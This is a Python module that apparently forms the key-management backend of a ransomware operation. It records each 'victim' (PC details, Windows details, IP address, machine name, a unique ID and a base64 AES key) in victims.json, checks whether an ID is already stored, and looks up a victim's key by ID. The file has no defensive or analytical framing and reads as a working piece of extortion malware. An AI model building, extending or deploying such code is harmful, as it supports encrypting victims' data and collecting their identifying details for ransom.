import json
import os



def read_json():
    with open("victims.json", "r") as file:
        return json.load(file)


def check_if_unique_exists(victims_object, unique_id):
    for victim in victims_object:
        if unique_id == victim["unique_id"]:
            return True
    return False


def get_victim_key(unique_id):
    json_file = read_json()
    victims = json_file["victims"]
    for victim in victims:
        if unique_id == victim["unique_id"]:
            return victim["base64_aes_key"]
    return False


def dump_to_json(pc_details, pc_name, windows_details, base64_aes_key, unique_id, ip):
    victim_details = {"pc_details": pc_details, "windows_details": windows_details, "ip": ip,
                      "pc_name": pc_name, "base64_aes_key": base64_aes_key, "unique_id": unique_id}

    if not os.path.exists("victims.json"):
        with open("victims.json", "w") as file:
            file.write(json.dumps({"victims": []}))

    json_file = read_json()
    victims = json_file["victims"]
    if check_if_unique_exists(victims, unique_id):
        return False
    victims.append(victim_details)
    with open("victims.json", "w") as file:
        file.write(json.dumps({"victims": victims}))
    return True

